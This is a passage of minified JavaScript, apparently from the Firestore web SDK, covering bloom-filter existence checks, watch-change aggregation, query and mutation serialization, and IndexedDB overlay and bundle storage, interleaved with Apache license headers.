class uv{constructor(){this.onExistenceFilterMismatchCallbacks=new Map}static get instance(){return Ac}static getOrCreateInstance(){return null===Ac&&(Ac=new uv),Ac}onExistenceFilterMismatch(e){const t=Symbol();return this.onExistenceFilterMismatchCallbacks.set(t,e),()=>this.onExistenceFilterMismatchCallbacks.delete(t)}notifyOnExistenceFilterMismatch(e){this.onExistenceFilterMismatchCallbacks.forEach((t=>t(e)))}}let Ac=null;
/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function bx(){return new TextEncoder}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Y$=new Yo([4294967295,4294967295],0);function iS(e){const t=bx().encode(e),n=new V4;return n.update(t),new Uint8Array(n.digest())}function sS(e){const t=new DataView(e.buffer),n=t.getUint32(0,!0),r=t.getUint32(4,!0),i=t.getUint32(8,!0),s=t.getUint32(12,!0);return[new Yo([n,r],0),new Yo([i,s],0)]}class cv{constructor(e,t,n){if(this.bitmap=e,this.padding=t,this.hashCount=n,t<0||t>=8)throw new cl(`Invalid padding: ${t}`);if(n<0)throw new cl(`Invalid hash count: ${n}`);if(e.length>0&&0===this.hashCount)throw new cl(`Invalid hash count: ${n}`);if(0===e.length&&0!==t)throw new cl(`Invalid padding when bitmap length is 0: ${t}`);this.yt=8*e.length-t,this.It=Yo.fromNumber(this.yt)}Tt(e,t,n){let r=e.add(t.multiply(Yo.fromNumber(n)));return 1===r.compare(Y$)&&(r=new Yo([r.getBits(0),r.getBits(1)],0)),r.modulo(this.It).toNumber()}Et(e){return 0!=(this.bitmap[Math.floor(e/8)]&1<<e%8)}At(e){if(0===this.yt)return!1;const t=iS(e),[n,r]=sS(t);for(let e=0;e<this.hashCount;e++){const t=this.Tt(n,r,e);if(!this.Et(t))return!1}return!0}static create(e,t,n){const r=e%8==0?0:8-e%8,i=new Uint8Array(Math.ceil(e/8)),s=new cv(i,r,t);return n.forEach((e=>s.insert(e))),s}insert(e){if(0===this.yt)return;const t=iS(e),[n,r]=sS(t);for(let e=0;e<this.hashCount;e++){const t=this.Tt(n,r,e);this.Rt(t)}}Rt(e){const t=Math.floor(e/8),n=e%8;this.bitmap[t]|=1<<n}}class cl extends Error{constructor(){super(...arguments),this.name="BloomFilterError"
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class Vu{constructor(e,t,n,r,i){this.snapshotVersion=e,this.targetChanges=t,this.targetMismatches=n,this.documentUpdates=r,this.resolvedLimboDocuments=i}static createSynthesizedRemoteEventForCurrentChange(e,t,n){const r=new Map;return r.set(e,Uu.createSynthesizedTargetChangeForCurrentChange(e,t,n)),new Vu(ee.min(),r,new Be(ue),_n(),ce())}}class Uu{constructor(e,t,n,r,i){this.resumeToken=e,this.current=t,this.addedDocuments=n,this.modifiedDocuments=r,this.removedDocuments=i}static createSynthesizedTargetChangeForCurrentChange(e,t,n){return new Uu(n,t,ce(),ce(),ce())}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ih{constructor(e,t,n,r){this.vt=e,this.removedTargetIds=t,this.key=n,this.Pt=r}}class Ox{constructor(e,t){this.targetId=e,this.bt=t}}class Px{constructor(e,t,n=Ct.EMPTY_BYTE_STRING,r=null){this.state=e,this.targetIds=t,this.resumeToken=n,this.cause=r}}class oS{constructor(){this.Vt=0,this.St=lS(),this.Dt=Ct.EMPTY_BYTE_STRING,this.Ct=!1,this.xt=!0}get current(){return this.Ct}get resumeToken(){return this.Dt}get Nt(){return 0!==this.Vt}get kt(){return this.xt}Mt(e){e.approximateByteSize()>0&&(this.xt=!0,this.Dt=e)}Ot(){let e=ce(),t=ce(),n=ce();return this.St.forEach(((r,i)=>{switch(i){case 0:e=e.add(r);break;case 2:t=t.add(r);break;case 1:n=n.add(r);break;default:G()}})),new Uu(this.Dt,this.Ct,e,t,n)}$t(){this.xt=!1,this.St=lS()}Ft(e,t){this.xt=!0,this.St=this.St.insert(e,t)}Bt(e){this.xt=!0,this.St=this.St.remove(e)}Lt(){this.Vt+=1}qt(){this.Vt-=1}Ut(){this.xt=!0,this.Ct=!0}}class W${constructor(e){this.Kt=e,this.Gt=new Map,this.Qt=_n(),this.jt=aS(),this.zt=new Be(ue)}Wt(e){for(const t of e.vt)e.Pt&&e.Pt.isFoundDocument()?this.Ht(t,e.Pt):this.Jt(t,e.key,e.Pt);for(const t of e.removedTargetIds)this.Jt(t,e.key,e.Pt)}Yt(e){this.forEachTarget(e,(t=>{const n=this.Xt(t);switch(e.state){case 0:this.Zt(t)&&n.Mt(e.resumeToken);break;case 1:n.qt(),n.Nt||n.$t(),n.Mt(e.resumeToken);break;case 2:n.qt(),n.Nt||this.removeTarget(t);break;case 3:this.Zt(t)&&(n.Ut(),n.Mt(e.resumeToken));break;case 4:this.Zt(t)&&(this.te(t),n.Mt(e.resumeToken));break;default:G()}}))}forEachTarget(e,t){e.targetIds.length>0?e.targetIds.forEach(t):this.Gt.forEach(((e,n)=>{this.Zt(n)&&t(n)}))}ee(e){var t;const n=e.targetId,r=e.bt.count,i=this.ne(n);if(i){const s=i.target;if(Kh(s))if(0===r){const e=new B(s.path);this.Jt(n,e,We.newNoDocument(e,ee.min()))}else te(1===r);else{const i=this.se(n);if(i!==r){const r=this.ie(e,i);if(0!==r){this.te(n);const e=2===r?"TargetPurposeExistenceFilterMismatchBloom":"TargetPurposeExistenceFilterMismatch";this.zt=this.zt.insert(n,e)}null===(t=uv.instance)||void 0===t||t.notifyOnExistenceFilterMismatch(function(e,t,n){var r,i,s,o,a,l;const u={localCacheCount:t,existenceFilterCount:n.count},c=n.unchangedNames;return c&&(u.bloomFilter={applied:0===e,hashCount:null!==(r=null==c?void 0:c.hashCount)&&void 0!==r?r:0,bitmapLength:null!==(o=null===(s=null===(i=null==c?void 0:c.bits)||void 0===i?void 0:i.bitmap)||void 0===s?void 0:s.length)&&void 0!==o?o:0,padding:null!==(l=null===(a=null==c?void 0:c.bits)||void 0===a?void 0:a.padding)&&void 0!==l?l:0}),u}(r,i,e.bt))}}}}ie(e,t){const{unchangedNames:n,count:r}=e.bt;if(!n||!n.bits)return 1;const{bits:{bitmap:i="",padding:s=0},hashCount:o=0}=n;let a,l;try{a=Fi(i).toUint8Array()}catch(e){if(e instanceof sx)return sr("Decoding the base64 bloom filter in existence filter failed ("+e.message+"); ignoring the bloom filter and falling back to full re-query."),1;throw e}try{l=new cv(a,s,o)}catch(e){return sr(e instanceof cl?"BloomFilter error: ":"Applying bloom filter failed: ",e),1}return 0===l.yt?1:r!==t-this.re(e.targetId,l)?2:0}re(e,t){const n=this.Kt.getRemoteKeysForTarget(e);let r=0;return n.forEach((n=>{const i=this.Kt.oe(),s=`projects/${i.projectId}/databases/${i.database}/documents/${n.path.canonicalString()}`;t.At(s)||(this.Jt(e,n,null),r++)})),r}ue(e){const t=new Map;this.Gt.forEach(((n,r)=>{const i=this.ne(r);if(i){if(n.current&&Kh(i.target)){const t=new B(i.target.path);null!==this.Qt.get(t)||this.ce(r,t)||this.Jt(r,t,We.newNoDocument(t,e))}n.kt&&(t.set(r,n.Ot()),n.$t())}}));let n=ce();this.jt.forEach(((e,t)=>{let r=!0;t.forEachWhile((e=>{const t=this.ne(e);return!t||"TargetPurposeLimboResolution"===t.purpose||(r=!1,!1)})),r&&(n=n.add(e))})),this.Qt.forEach(((t,n)=>n.setReadTime(e)));const r=new Vu(e,t,this.zt,this.Qt,n);return this.Qt=_n(),this.jt=aS(),this.zt=new Be(ue),r}Ht(e,t){if(!this.Zt(e))return;const n=this.ce(e,t.key)?2:0;this.Xt(e).Ft(t.key,n),this.Qt=this.Qt.insert(t.key,t),this.jt=this.jt.insert(t.key,this.ae(t.key).add(e))}Jt(e,t,n){if(!this.Zt(e))return;const r=this.Xt(e);this.ce(e,t)?r.Ft(t,1):r.Bt(t),this.jt=this.jt.insert(t,this.ae(t).delete(e)),n&&(this.Qt=this.Qt.insert(t,n))}removeTarget(e){this.Gt.delete(e)}se(e){const t=this.Xt(e).Ot();return this.Kt.getRemoteKeysForTarget(e).size+t.addedDocuments.size-t.removedDocuments.size}Lt(e){this.Xt(e).Lt()}Xt(e){let t=this.Gt.get(e);return t||(t=new oS,this.Gt.set(e,t)),t}ae(e){let t=this.jt.get(e);return t||(t=new He(ue),this.jt=this.jt.insert(e,t)),t}Zt(e){const t=null!==this.ne(e);return t||V("WatchChangeAggregator","Detected inactive target",e),t}ne(e){const t=this.Gt.get(e);return t&&t.Nt?null:this.Kt.he(e)}te(e){this.Gt.set(e,new oS),this.Kt.getRemoteKeysForTarget(e).forEach((t=>{this.Jt(e,t,null)}))}ce(e,t){return this.Kt.getRemoteKeysForTarget(e).has(t)}}function aS(){return new Be(B.comparator)}function lS(){return new Be(B.comparator)}const G$={asc:"ASCENDING",desc:"DESCENDING"},H$={"<":"LESS_THAN","<=":"LESS_THAN_OR_EQUAL",">":"GREATER_THAN",">=":"GREATER_THAN_OR_EQUAL","==":"EQUAL","!=":"NOT_EQUAL","array-contains":"ARRAY_CONTAINS",in:"IN","not-in":"NOT_IN","array-contains-any":"ARRAY_CONTAINS_ANY"},K$={and:"AND",or:"OR"};class Q${constructor(e,t){this.databaseId=e,this.useProto3Json=t}}function og(e,t){return e.useProto3Json||Ou(t)?t:{value:t}}function ua(e,t){return e.useProto3Json?`${new Date(1e3*t.seconds).toISOString().replace(/\.\d*/,"").replace("Z","")}.${("000000000"+t.nanoseconds).slice(-9)}Z`:{seconds:""+t.seconds,nanos:t.nanoseconds}}function $x(e,t){return e.useProto3Json?t.toBase64():t.toUint8Array()}function X$(e,t){return ua(e,t.toTimestamp())}function yt(e){return te(!!e),ee.fromTimestamp(function(e){const t=Li(e);return new et(t.seconds,t.nanos)}(e))}function hv(e,t){return(n=e,new Te(["projects",n.projectId,"databases",n.database])).child("documents").child(t).canonicalString();var n}function Lx(e){const t=Te.fromString(e);return te(Wx(t)),t}function uu(e,t){return hv(e.databaseId,t.path)}function vr(e,t){const n=Lx(t);if(n.get(1)!==e.databaseId.projectId)throw new L(M.INVALID_ARGUMENT,"Tried to deserialize key from different project: "+n.get(1)+" vs "+e.databaseId.projectId);if(n.get(3)!==e.databaseId.database)throw new L(M.INVALID_ARGUMENT,"Tried to deserialize key from different database: "+n.get(3)+" vs "+e.databaseId.database);return new B(Vx(n))}function ag(e,t){return hv(e.databaseId,t)}function Fx(e){const t=Lx(e);return 4===t.length?Te.emptyPath():Vx(t)}function cu(e){return new Te(["projects",e.databaseId.projectId,"databases",e.databaseId.database]).canonicalString()}function Vx(e){return te(e.length>4&&"documents"===e.get(4)),e.popFirst(5)}function uS(e,t,n){return{name:uu(e,t),fields:n.value.mapValue.fields}}function Ux(e,t,n){const r=vr(e,t.name),i=yt(t.updateTime),s=t.createTime?yt(t.createTime):ee.min(),o=new Yt({mapValue:{fields:t.fields}}),a=We.newFoundDocument(r,i,s,o);return n&&a.setHasCommittedMutations(),n?a.setHasCommittedMutations():a}function J$(e,t){return"found"in t?function(e,t){te(!!t.found),t.found.name,t.found.updateTime;const n=vr(e,t.found.name),r=yt(t.found.updateTime),i=t.found.createTime?yt(t.found.createTime):ee.min(),s=new Yt({mapValue:{fields:t.found.fields}});return We.newFoundDocument(n,r,i,s)}(e,t):"missing"in t?function(e,t){te(!!t.missing),te(!!t.readTime);const n=vr(e,t.missing),r=yt(t.readTime);return We.newNoDocument(n,r)}(e,t):G()}function Z$(e,t){let n;if("targetChange"in t){t.targetChange;const i="NO_CHANGE"===(r=t.targetChange.targetChangeType||"NO_CHANGE")?0:"ADD"===r?1:"REMOVE"===r?2:"CURRENT"===r?3:"RESET"===r?4:G(),s=t.targetChange.targetIds||[],o=function(e,t){return e.useProto3Json?(te(void 0===t||"string"==typeof t),Ct.fromBase64String(t||"")):(te(void 0===t||t instanceof Uint8Array),Ct.fromUint8Array(t||new Uint8Array))}(e,t.targetChange.resumeToken),a=t.targetChange.cause,l=a&&function(e){const t=void 0===e.code?M.UNKNOWN:Ax(e.code);return new L(t,e.message||"")}(a);n=new Px(i,s,o,l||null)}else if("documentChange"in t){t.documentChange;const r=t.documentChange;r.document,r.document.name,r.document.updateTime;const i=vr(e,r.document.name),s=yt(r.document.updateTime),o=r.document.createTime?yt(r.document.createTime):ee.min(),a=new Yt({mapValue:{fields:r.document.fields}}),l=We.newFoundDocument(i,s,o,a),u=r.targetIds||[],c=r.removedTargetIds||[];n=new ih(u,c,l.key,l)}else if("documentDelete"in t){t.documentDelete;const r=t.documentDelete;r.document;const i=vr(e,r.document),s=r.readTime?yt(r.readTime):ee.min(),o=We.newNoDocument(i,s),a=r.removedTargetIds||[];n=new ih([],a,o.key,o)}else if("documentRemove"in t){t.documentRemove;const r=t.documentRemove;r.document;const i=vr(e,r.document),s=r.removedTargetIds||[];n=new ih([],s,i,null)}else{if(!("filter"in t))return G();{t.filter;const e=t.filter;e.targetId;const{count:r=0,unchangedNames:i}=e,s=new q$(r,i),o=e.targetId;n=new Ox(o,s)}}var r;return n}function hu(e,t){let n;if(t instanceof Ta)n={update:uS(e,t.key,t.value)};else if(t instanceof xa)n={delete:uu(e,t.key)};else if(t instanceof Zr)n={update:uS(e,t.key,t.data),updateMask:sL(t.fieldMask)};else{if(!(t instanceof sv))return G();n={verify:uu(e,t.key)}}return t.fieldTransforms.length>0&&(n.updateTransforms=t.fieldTransforms.map((e=>function(e,t){const n=t.transform;if(n instanceof aa)return{fieldPath:t.field.canonicalString(),setToServerValue:"REQUEST_TIME"};if(n instanceof Bs)return{fieldPath:t.field.canonicalString(),appendMissingElements:{values:n.elements}};if(n instanceof js)return{fieldPath:t.field.canonicalString(),removeAllFromArray:{values:n.elements}};if(n instanceof la)return{fieldPath:t.field.canonicalString(),increment:n.wt};throw G()}(0,e)))),t.precondition.isNone||(n.currentDocument=(r=e,void 0!==(i=t.precondition).updateTime?{updateTime:X$(r,i.updateTime)}:void 0!==i.exists?{exists:i.exists}:G())),n;var r,i}function lg(e,t){const n=t.currentDocument?void 0!==(i=t.currentDocument).updateTime?Ze.updateTime(yt(i.updateTime)):void 0!==i.exists?Ze.exists(i.exists):Ze.none():Ze.none(),r=t.updateTransforms?t.updateTransforms.map((t=>function(e,t){let n=null;if("setToServerValue"in t)te("REQUEST_TIME"===t.setToServerValue),n=new aa;else if("appendMissingElements"in t){const e=t.appendMissingElements.values||[];n=new Bs(e)}else if("removeAllFromArray"in t){const e=t.removeAllFromArray.values||[];n=new js(e)}else"increment"in t?n=new la(e,t.increment):G();const r=gt.fromServerFormat(t.fieldPath);return new Fu(r,n)}(e,t))):[];var i;if(t.update){t.update.name;const i=vr(e,t.update.name),s=new Yt({mapValue:{fields:t.update.fields}});if(t.updateMask){const e=function(e){const t=e.fieldPaths||[];return new Sn(t.map((e=>gt.fromServerFormat(e))))}(t.updateMask);return new Zr(i,s,e,n,r)}return new Ta(i,s,n,r)}if(t.delete){const r=vr(e,t.delete);return new xa(r,n)}if(t.verify){const r=vr(e,t.verify);return new sv(r,n)}return G()}function eL(e,t){return e&&e.length>0?(te(void 0!==t),e.map((e=>function(e,t){let n=e.updateTime?yt(e.updateTime):yt(t);return n.isEqual(ee.min())&&(n=yt(t)),new z$(n,e.transformResults||[])}(e,t)))):[]}function zx(e,t){return{documents:[ag(e,t.path)]}}function Bx(e,t){const n={structuredQuery:{}},r=t.path;null!==t.collectionGroup?(n.parent=ag(e,r),n.structuredQuery.from=[{collectionId:t.collectionGroup,allDescendants:!0}]):(n.parent=ag(e,r.popLast()),n.structuredQuery.from=[{collectionId:r.lastSegment()}]);const i=function(e){if(0!==e.length)return Yx(Ae.create(e,"and"))}(t.filters);i&&(n.structuredQuery.where=i);const s=function(e){if(0!==e.length)return e.map((e=>{return{field:wo((t=e).field),direction:nL(t.dir)};var t}))}(t.orderBy);s&&(n.structuredQuery.orderBy=s);const o=og(e,t.limit);var a,l;return null!==o&&(n.structuredQuery.limit=o),t.startAt&&(n.structuredQuery.startAt={before:(a=t.startAt).inclusive,values:a.position}),t.endAt&&(n.structuredQuery.endAt={before:!(l=t.endAt).inclusive,values:l.position}),n}function jx(e){let t=Fx(e.parent);const n=e.structuredQuery,r=n.from?n.from.length:0;let i=null;if(r>0){te(1===r);const e=n.from[0];e.allDescendants?i=e.collectionId:t=t.child(e.collectionId)}let s=[];n.where&&(s=function(e){const t=qx(e);return t instanceof Ae&&tv(t)?t.getFilters():[t]}(n.where));let o=[];n.orderBy&&(o=n.orderBy.map((e=>{return new Wo(So((t=e).field),function(e){switch(e){case"ASCENDING":return"asc";case"DESCENDING":return"desc";default:return}}(t.direction));var t})));let a=null;n.limit&&(a=function(e){let t;return t="object"==typeof e?e.value:e,Ou(t)?null:t}(n.limit));let l=null;n.startAt&&(l=function(e){const t=!!e.before,n=e.values||[];return new zi(n,t)}(n.startAt));let u=null;return n.endAt&&(u=function(e){const t=!e.before,n=e.values||[];return new zi(n,t)}(n.endAt)),mx(t,i,o,s,a,"F",l,u)}function tL(e,t){const n=function(e){switch(e){case"TargetPurposeListen":return null;case"TargetPurposeExistenceFilterMismatch":return"existence-filter-mismatch";case"TargetPurposeExistenceFilterMismatchBloom":return"existence-filter-mismatch-bloom";case"TargetPurposeLimboResolution":return"limbo-document";default:return G()}}(t.purpose);return null==n?null:{"goog-listen-tags":n}}function qx(e){return void 0!==e.unaryFilter?function(e){switch(e.unaryFilter.op){case"IS_NAN":const t=So(e.unaryFilter.field);return ye.create(t,"==",{doubleValue:NaN});case"IS_NULL":const n=So(e.unaryFilter.field);return ye.create(n,"==",{nullValue:"NULL_VALUE"});case"IS_NOT_NAN":const r=So(e.unaryFilter.field);return ye.create(r,"!=",{doubleValue:NaN});case"IS_NOT_NULL":const i=So(e.unaryFilter.field);return ye.create(i,"!=",{nullValue:"NULL_VALUE"});default:return G()}}(e):void 0!==e.fieldFilter?(t=e,ye.create(So(t.fieldFilter.field),function(e){switch(e){case"EQUAL":return"==";case"NOT_EQUAL":return"!=";case"GREATER_THAN":return">";case"GREATER_THAN_OR_EQUAL":return">=";case"LESS_THAN":return"<";case"LESS_THAN_OR_EQUAL":return"<=";case"ARRAY_CONTAINS":return"array-contains";case"IN":return"in";case"NOT_IN":return"not-in";case"ARRAY_CONTAINS_ANY":return"array-contains-any";default:return G()}}(t.fieldFilter.op),t.fieldFilter.value)):void 0!==e.compositeFilter?function(e){return Ae.create(e.compositeFilter.filters.map((e=>qx(e))),function(e){switch(e){case"AND":return"and";case"OR":return"or";default:return G()}}(e.compositeFilter.op))}(e):G();var t}function nL(e){return G$[e]}function rL(e){return H$[e]}function iL(e){return K$[e]}function wo(e){return{fieldPath:e.canonicalString()}}function So(e){return gt.fromServerFormat(e.fieldPath)}function Yx(e){return e instanceof ye?function(e){if("=="===e.op){if(Ww(e.value))return{unaryFilter:{field:wo(e.field),op:"IS_NAN"}};if(Yw(e.value))return{unaryFilter:{field:wo(e.field),op:"IS_NULL"}}}else if("!="===e.op){if(Ww(e.value))return{unaryFilter:{field:wo(e.field),op:"IS_NOT_NAN"}};if(Yw(e.value))return{unaryFilter:{field:wo(e.field),op:"IS_NOT_NULL"}}}return{fieldFilter:{field:wo(e.field),op:rL(e.op),value:e.value}}}(e):e instanceof Ae?function(e){const t=e.getFilters().map((e=>Yx(e)));return 1===t.length?t[0]:{compositeFilter:{op:iL(e.op),filters:t}}}(e):G()}function sL(e){const t=[];return e.fields.forEach((e=>t.push(e.canonicalString()))),{fieldPaths:t}}function Wx(e){return e.length>=4&&"projects"===e.get(0)&&"databases"===e.get(2)}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Vr{constructor(e,t,n,r,i=ee.min(),s=ee.min(),o=Ct.EMPTY_BYTE_STRING,a=null){this.target=e,this.targetId=t,this.purpose=n,this.sequenceNumber=r,this.snapshotVersion=i,this.lastLimboFreeSnapshotVersion=s,this.resumeToken=o,this.expectedCount=a}withSequenceNumber(e){return new Vr(this.target,this.targetId,this.purpose,e,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,this.expectedCount)}withResumeToken(e,t){return new Vr(this.target,this.targetId,this.purpose,this.sequenceNumber,t,this.lastLimboFreeSnapshotVersion,e,null)}withExpectedCount(e){return new Vr(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,e)}withLastLimboFreeSnapshotVersion(e){return new Vr(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,e,this.resumeToken,this.expectedCount)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Gx{constructor(e){this.le=e}}function oL(e,t){let n;if(t.document)n=Ux(e.le,t.document,!!t.hasCommittedMutations);else if(t.noDocument){const e=B.fromSegments(t.noDocument.path),r=Ys(t.noDocument.readTime);n=We.newNoDocument(e,r),t.hasCommittedMutations&&n.setHasCommittedMutations()}else{if(!t.unknownDocument)return G();{const e=B.fromSegments(t.unknownDocument.path),r=Ys(t.unknownDocument.version);n=We.newUnknownDocument(e,r)}}return t.readTime&&n.setReadTime(function(e){const t=new et(e[0],e[1]);return ee.fromTimestamp(t)}(t.readTime)),n}function cS(e,t){const n=t.key,r={prefixPath:n.getCollectionPath().popLast().toArray(),collectionGroup:n.collectionGroup,documentId:n.path.lastSegment(),readTime:Jh(t.readTime),hasCommittedMutations:t.hasCommittedMutations};if(t.isFoundDocument())r.document={name:uu(i=e.le,(s=t).key),fields:s.data.value.mapValue.fields,updateTime:ua(i,s.version.toTimestamp()),createTime:ua(i,s.createTime.toTimestamp())};else if(t.isNoDocument())r.noDocument={path:n.path.toArray(),readTime:qs(t.version)};else{if(!t.isUnknownDocument())return G();r.unknownDocument={path:n.path.toArray(),version:qs(t.version)}}var i,s;return r}function Jh(e){const t=e.toTimestamp();return[t.seconds,t.nanoseconds]}function qs(e){const t=e.toTimestamp();return{seconds:t.seconds,nanoseconds:t.nanoseconds}}function Ys(e){const t=new et(e.seconds,e.nanoseconds);return ee.fromTimestamp(t)}function ms(e,t){const n=(t.baseMutations||[]).map((t=>lg(e.le,t)));for(let e=0;e<t.mutations.length-1;++e){const n=t.mutations[e];if(e+1<t.mutations.length&&void 0!==t.mutations[e+1].transform){const r=t.mutations[e+1];n.updateTransforms=r.transform.fieldTransforms,t.mutations.splice(e+1,1),++e}}const r=t.mutations.map((t=>lg(e.le,t))),i=et.fromMillis(t.localWriteTimeMs);return new ov(t.batchId,i,n,r)}function hl(e){const t=Ys(e.readTime),n=void 0!==e.lastLimboFreeSnapshotVersion?Ys(e.lastLimboFreeSnapshotVersion):ee.min();let r;var i;return void 0!==e.query.documents?(te(1===(i=e.query).documents.length),r=kn(Ea(Fx(i.documents[0])))):r=kn(jx(e.query)),new Vr(r,e.targetId,"TargetPurposeListen",e.lastListenSequenceNumber,t,n,Ct.fromBase64String(e.resumeToken))}function Hx(e,t){const n=qs(t.snapshotVersion),r=qs(t.lastLimboFreeSnapshotVersion);let i;i=Kh(t.target)?zx(e.le,t.target):Bx(e.le,t.target);const s=t.resumeToken.toBase64();return{targetId:t.targetId,canonicalId:zs(t.target),readTime:n,resumeToken:s,lastListenSequenceNumber:t.sequenceNumber,lastLimboFreeSnapshotVersion:r,query:i}}function dv(e){const t=jx({parent:e.parent,structuredQuery:e.structuredQuery});return"LAST"===e.limitType?Xh(t,t.limit,"L"):t}function kp(e,t){return new lv(t.largestBatchId,lg(e.le,t.overlayMutation))}function hS(e,t){const n=t.path.lastSegment();return[e,dn(t.path.popLast()),n]}function dS(e,t,n,r){return{indexId:e,uid:t.uid||"",sequenceNumber:n,readTime:qs(r.readTime),documentKey:dn(r.documentKey.path),largestBatchId:r.largestBatchId}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class aL{getBundleMetadata(e,t){return fS(e).get(t).next((e=>{if(e)return{id:(t=e).bundleId,createTime:Ys(t.createTime),version:t.version};var t}))}saveBundleMetadata(e,t){return fS(e).put({bundleId:(n=t).id,createTime:qs(yt(n.createTime)),version:n.version});var n}getNamedQuery(e,t){return pS(e).get(t).next((e=>{if(e)return{name:(t=e).name,query:dv(t.bundledQuery),readTime:Ys(t.readTime)};var t}))}saveNamedQuery(e,t){return pS(e).put({name:(n=t).name,readTime:qs(yt(n.readTime)),bundledQuery:n.bundledQuery});var n}}function fS(e){return Ft(e,"bundles")}function pS(e){return Ft(e,"namedQueries")}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Kd{constructor(e,t){this.serializer=e,this.userId=t}static fe(e,t){const n=t.uid||"";return new Kd(e,n)}getOverlay(e,t){return Xa(e).get(hS(this.userId,t)).next((e=>e?kp(this.serializer,e):null))}getOverlays(e,t){const n=mr();return C.forEach(t,(t=>this.getOverlay(e,t).next((e=>{null!==e&&n.set(t,e)})))).next((()=>n))}saveOverlays(e,t,n){const r=[];return n.forEach(((n,i)=>{const s=new lv(t,i);r.push(this.de(e,s))})),C.waitFor(r)}removeOverlaysForBatchId(e,t,n){const r=new Set;t.forEach((e=>r.add(dn(e.getCollectionPath()))));const i=[];return r.forEach((t=>{const r=IDBKeyRange.bound([this.userId,t,n],[this.userId,t,n+1],!1,!0);i.push(Xa(e).J("collectionPathOverlayIndex",r))})),C.waitFor(i)}getOverlaysForCollection(e,t,n){const r=mr(),i=dn(t),s=IDBKeyRange.bound([this.userId,i,n],[this.userId,i,Number.POSITIVE_INFINITY],!0);return Xa(e).j("collectionPathOverlayIndex",s).next((e=>{for(const t of e){const e=kp(this.serializer,t);r.set(e.getKey(),e)}return r}))}getOverlaysForCollectionGroup(e,t,n,r){const i=mr();let s;const o=IDBKeyRange.bound([this.userId,t,n],[this.userId,t,Number.POSITIVE_INFINITY],!0);return Xa(e).X({index:"collectionGroupOverlayIndex",range:o},((e,t,n)=>{const o=kp(this.serializer,t);i.size()<r||o.largestBatchId===s?(i.set(o.getKey(),o),s=o.largestBatchId):n.done()})).next((()=>i))}de(e,t){return Xa(e).put(function(e,t,n){const[r,i,s]=hS(t,n.mutation.key);return{userId:t,collectionPath:i,documentId:s,collectionGroup:n.mutation.key.getCollectionGroup(),largestBatchId:n.largestBatchId,overlayMutation:hu(e.le,n.mutation)}}(this.serializer,this.userId,t))}}function Xa(e){return Ft(e,"documentOverlays")}
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
